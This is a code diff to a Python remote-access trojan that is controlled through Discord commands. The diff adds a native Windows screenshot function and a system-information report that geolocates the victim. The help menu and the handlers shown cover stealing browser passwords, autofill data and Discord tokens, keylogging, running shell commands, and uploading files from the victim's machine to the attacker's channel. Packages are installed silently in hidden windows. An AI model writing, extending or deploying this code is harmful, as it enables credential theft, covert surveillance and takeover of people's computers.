@@ -14,6 +14,7 @@ import sqlite3
 import platform
 import threading
 import subprocess
+import ctypes.wintypes
 
 VERSION = "1.0"
 PYTHON_CMD = sys.executable
@@ -31,13 +32,13 @@ def InstallPackages(packages):
         log.info(f"Installing package {package}")
         subprocess.run([PYTHON_CMD, "-m", "pip", "install", package], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
 
-InstallPackages(packages=["requests", "pycryptodome", "pyautogui", "pyperclip", "nextcord", "pynput"])
+InstallPackages(packages=["requests", "pycryptodome", "pyperclip", "nextcord", "pynput", "pillow"])
 
 import nextcord as discord
 import requests
 import pyperclip
-import pyautogui
 
+from PIL import Image
 from Crypto.Cipher import AES
 from pynput.keyboard import Key, Listener
 
@@ -52,11 +53,14 @@ ROAMING = os.getenv('APPDATA')
 USER_HOME = f"C:\\Users\\{os.getlogin()}"
 CONTAINER_FOLDER_PATH = f"C:\\Users\\{os.getlogin()}\\My Games"
 
+blue = "[2;45m[0m[2;45m[0m[2;35m"
+purple = "[2;34m"
+reset = "[0m"
+
 
 # ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
 # ==================================================================================================================================================================================================================== #
 if not os.path.exists(CONTAINER_FOLDER_PATH):
-    log.info(f"First time execution setup :\n   - Creation of the container folder")
     os.mkdir(CONTAINER_FOLDER_PATH)
 
 # ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
@@ -118,6 +122,35 @@ def GetIdleTime():
         millis = ctypes.windll.kernel32.GetTickCount() - lii.dwTime
         return millis / 1000
     return 0
+
+class BITMAPINFOHEADER(ctypes.Structure):
+    _fields_ = [("biSize", ctypes.wintypes.DWORD),("biWidth", ctypes.wintypes.LONG),("biHeight", ctypes.wintypes.LONG),("biPlanes", ctypes.wintypes.WORD),("biBitCount", ctypes.wintypes.WORD),("biCompression", ctypes.wintypes.DWORD),("biSizeImage", ctypes.wintypes.DWORD),("biXPelsPerMeter", ctypes.wintypes.LONG),("biYPelsPerMeter", ctypes.wintypes.LONG),("biClrUsed", ctypes.wintypes.DWORD),("biClrImportant", ctypes.wintypes.DWORD),]
+
+def Screenshot():
+    user32 = ctypes.windll.user32
+    gdi32 = ctypes.windll.gdi32
+    screen_width = user32.GetSystemMetrics(0)
+    screen_height = user32.GetSystemMetrics(1)
+    hdc_screen = user32.GetDC(0)
+    hdc_mem = gdi32.CreateCompatibleDC(hdc_screen)
+    hbm = gdi32.CreateCompatibleBitmap(hdc_screen, screen_width, screen_height)
+    gdi32.SelectObject(hdc_mem, hbm)
+    gdi32.BitBlt(hdc_mem, 0, 0, screen_width, screen_height, hdc_screen, 0, 0, 0x00CC0020)
+    bmp_info = BITMAPINFOHEADER()
+    bmp_info.biSize = ctypes.sizeof(BITMAPINFOHEADER)
+    bmp_info.biWidth = screen_width
+    bmp_info.biHeight = -screen_height
+    bmp_info.biPlanes = 1
+    bmp_info.biBitCount = 32
+    bmp_info.biCompression = 0
+    buffer_size = screen_width * screen_height * 4
+    buffer = ctypes.create_string_buffer(buffer_size)
+    gdi32.GetDIBits(hdc_screen, hbm, 0, screen_height, buffer, ctypes.byref(bmp_info), 0)
+    gdi32.DeleteObject(hbm)
+    gdi32.DeleteDC(hdc_mem)
+    user32.ReleaseDC(0, hdc_screen)
+    image = Image.frombuffer("RGB", (screen_width, screen_height), buffer, "raw", "BGRX", 0, 1)
+    image.save(f"{CONTAINER_FOLDER_PATH}\\{os.getlogin()} - Screenshot.png")
 
 # ____________________________________________________________________________________________________________________________________________________ #
 # ========================================================== DISCORD FUNCS =========================================================================== #
@@ -459,7 +492,7 @@ class Client(discord.Client):
             elif message.content == ".help":
                 await message.delete()
 
-                embed = discord.Embed(description=f"**Help Menu :**\n- `.ping` : Show connected devices\n- `.clear` : Clear the current text channel\n- `.kill <process.exe>` : Kill process\n- `.clipboard` : Show copied elements\n- `.grab autofill` : Grab autofill field from web browser\n- `.grab discord` : Grab user's Discord informations\n- `.grab password` : Grab passwords from web browser\n- `.grab pc` : Grab PC informations\n- `.screenshot` : Take a screenshot\n- `.start keylogger` : Start the keylogger\n- `.stop keylogger` : Stop the keylogger and send keys pressed\n- `.cd <path>` : Change  the working directory\n- `.shell <cmd>` : Execute cmd commands\n- `.download <path/to/file>` : Download a file from the computer\n- `.idle` : Show in secondes the afk time", color=discord.Color.blue())
+                embed = discord.Embed(description=f"**Help Menu :**\n- `.ping` : Show connected devices\n- `.clear` : Clear the current text channel\n- `.kill <process.exe>` : Kill process\n- `.clipboard` : Show copied elements\n- `.grab autofill` : Grab autofill field from web browser\n- `.grab discord` : Grab user's Discord informations\n- `.grab password` : Grab passwords from web browser\n- `.system` : Grab PC informations\n- `.screenshot` : Take a screenshot\n- `.start keylogger` : Start the keylogger\n- `.stop keylogger` : Stop the keylogger and send keys pressed\n- `.cd <path>` : Change  the working directory\n- `.shell <cmd>` : Execute cmd commands\n- `.download <path/to/file>` : Download a file from the computer\n- `.idle` : Show in secondes the afk time", color=discord.Color.blue())
                 await message.channel.send(embed=embed)
 
             # _____________________________________________________________________________________________________________________________________________ #
@@ -496,7 +529,7 @@ class Client(discord.Client):
                 await message.delete()
                 
                 embed = discord.Embed(description=":incoming_envelope: Uploading... This action may take time !", color=discord.Color.yellow())
-                embedSent = await message.channel.send(embed=embed)
+                embed_sent = await message.channel.send(embed=embed)
 
                 ExtractAutofill()
 
@@ -508,7 +541,7 @@ class Client(discord.Client):
                 fileEmbed = discord.File(filePath, filename=f"{os.getlogin()} - Auto-fill.txt")
                 await message.channel.send(file=fileEmbed)
 
-                await embedSent.delete()
+                await embed_sent.delete()
 
                 SafeRemove(filePath)
 
@@ -518,7 +551,7 @@ class Client(discord.Client):
                 await message.delete()
                 
                 embed = discord.Embed(description=":incoming_envelope: Uploading... This action may take time !", color=discord.Color.yellow())
-                embedSent = await message.channel.send(embed=embed)
+                embed_sent = await message.channel.send(embed=embed)
 
                 GetDiscordTokens()
                 tokens = ExtractInfosFromToken()
@@ -531,7 +564,7 @@ class Client(discord.Client):
                 fileEmbed = discord.File(filePath, filename=f"{os.getlogin()} - Discord Tokens.txt")
                 await message.channel.send(file=fileEmbed)
 
-                await embedSent.delete()
+                await embed_sent.delete()
 
                 SafeRemove(filePath)
 
@@ -541,7 +574,7 @@ class Client(discord.Client):
                 await message.delete()
                 
                 embed = discord.Embed(description=":incoming_envelope: Uploading... This action may take time !", color=discord.Color.yellow())
-                embedSent = await message.channel.send(embed=embed)
+                embed_sent = await message.channel.send(embed=embed)
 
                 ExtractPasswords()
                 formatted = ""
@@ -559,24 +592,24 @@ class Client(discord.Client):
                 fileEmbed = discord.File(filePath, filename=f"{os.getlogin()} - Passwords.txt")
                 await message.channel.send(file=fileEmbed)
 
-                await embedSent.delete()
+                await embed_sent.delete()
 
                 SafeRemove(filePath)
 
             # _______________________________________________________________________________________________________________________________________________ #
-            # =================================================================== .grab pc ================================================================== #
-            elif message.content == ".grab pc":
+            # =================================================================== .system ================================================================== #
+            elif message.content == ".system" or message.content == ".sys":
                 await message.delete()
                 
                 embed = discord.Embed(description=":incoming_envelope: Uploading... This action may take time !", color=discord.Color.yellow())
-                embedSent = await message.channel.send(embed=embed)
+                embed_sent = await message.channel.send(embed=embed)
 
                 requInfos = requests.get('https://ipinfo.io')
                 data = requInfos.json()
 
                 session = os.getlogin()
                 computer_name = socket.gethostname()
-                osVersion = platform.system() + " " + platform.release()
+                os_version = platform.system() + " " + platform.release()
                 architecture = platform.machine()
                 mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2 * 6, 2)][::-1])
                 ip = data.get('ip')
@@ -585,30 +618,16 @@ class Client(discord.Client):
                 city = data.get('city')
                 loc = data.get('loc')
                 org = data.get('org')
+                cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW, encoding="cp850").stdout.strip().split('\n')[2]
+                ram = subprocess.run(["powershell", "-Command", "Get-Process | Measure-Object -Property WorkingSet64 -Sum | ForEach-Object { \"{0:N2} MB\" -f ($_.Sum / 1MB) }"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW, encoding="cp850").stdout.strip()
 
-                filePath = f"{CONTAINER_FOLDER_PATH}/{GetRandomString(17)}.txt"
-                with open(filePath, "w") as f:
-                    f.write(f"""
-Session: {session}
-Computer Name: {computer_name}
-OS Version: {osVersion}
-Architecture: {architecture}
-MAC: {mac}
-IP: {ip}
-HWID: {subprocess.check_output("powershell (Get-CimInstance Win32_ComputerSystemProduct).UUID").decode().strip()}
-Country: {country}
-Region: {region}
-City: {city}
-Localisation: {loc}
-Internet Provider: {org}
-""")
+                embed = discord.Embed(description="", color=discord.Color.from_rgb(255, 255, 255))
+                embed.add_field(name=":computer: **Global Info**", value=f"```ansi\n{blue}Computer@Username{reset} : {computer_name}@{session}\n{blue}Operative System{reset} : {os_version}\n{blue}Architecture{reset} : {architecture}\n{blue}Idle Time{reset} : {GetIdleTime()}s```", inline=True)
+                embed.add_field(name=":floppy_disk: **Hardware**", value=f"```ansi\n{blue}RAM{reset} : {ram}\n{blue}CPU{reset} : {cpu}```", inline=True)
+                embed.add_field(name=":satellite: **Network Info**", value=f"```ansi\n{blue}Public IP{reset} : {ip}\n{blue}MAC{reset} : {mac}\n{blue}Country{reset} : {country}\n{blue}Region{reset} : {region}\n{blue}City{reset} : {city}\n{blue}Localisation{reset} : {loc}\n{blue}Internet Provider{reset} : {org}```", inline=False)
+                await message.channel.send(embed=embed)
 
-                fileEmbed = discord.File(filePath, filename=f"{os.getlogin()} - PC Infos.txt")
-                await message.channel.send(file=fileEmbed)
-
-                await embedSent.delete()
-
-                SafeRemove(filePath)
+                await embed_sent.delete()
 
             # __________________________________________________________________________________________________________________________________________________ #
             # =================================================================== .screenshot ================================================================== #
@@ -616,18 +635,16 @@ Internet Provider: {org}
                 await message.delete()
 
                 embed = discord.Embed(description=":incoming_envelope: Uploading... This action may take time !", color=discord.Color.yellow())
-                embedSent = await message.channel.send(embed=embed)
+                embed_sent = await message.channel.send(embed=embed)
                 
-                filePath = f"{CONTAINER_FOLDER_PATH}/{GetRandomString(17)}.png"
-                screenshot = pyautogui.screenshot()
-                screenshot.save(filePath)
+                Screenshot()
 
-                fileEmbed = discord.File(filePath, filename=f"{os.getlogin()} - Screenshot.png")
+                fileEmbed = discord.File(f"{CONTAINER_FOLDER_PATH}\\{os.getlogin()} - Screenshot.png", filename=f"{os.getlogin()} - Screenshot.png")
                 await message.channel.send(file=fileEmbed)
 
-                await embedSent.delete()
+                await embed_sent.delete()
 
-                SafeRemove(filePath)
+                SafeRemove(f"{CONTAINER_FOLDER_PATH}\\{os.getlogin()} - Screenshot.png")
 
             # _________________________________________________________________________________________________________________________________________________ #
             # =================================================================== .keylogger ================================================================== #
@@ -656,7 +673,7 @@ Internet Provider: {org}
                 keyloggerStatut = False
 
                 embed = discord.Embed(description=":incoming_envelope: Uploading... This action may take time !", color=discord.Color.yellow())
-                embedSent = await message.channel.send(embed=embed)
+                embed_sent = await message.channel.send(embed=embed)
                 
                 filePath = f"{CONTAINER_FOLDER_PATH}/{GetRandomString(17)}.txt"
                 finalMessage = ""
@@ -668,7 +685,7 @@ Internet Provider: {org}
                 fileEmbed = discord.File(filePath, filename=f"{os.getlogin()} - Keylogger Logs.txt")
                 await message.channel.send(file=fileEmbed)
 
-                await embedSent.delete()
+                await embed_sent.delete()
 
                 SafeRemove(filePath)
 
@@ -722,13 +739,13 @@ Internet Provider: {org}
                     return
 
                 embed = discord.Embed(description=":incoming_envelope: Uploading... This action may take time !", color=discord.Color.yellow())
-                embedSent = await message.channel.send(embed=embed)
+                embed_sent = await message.channel.send(embed=embed)
 
                 filePath = command[1]
                 fileEmbed = discord.File(filePath, filename=f"{os.getlogin()} - {os.path.basename(filePath)}")
                 await message.channel.send(file=fileEmbed)
 
-                await embedSent.delete()
+                await embed_sent.delete()
 
             # ____________________________________________________________________________________________________________________________________________ #
             # =================================================================== .idle ================================================================== #
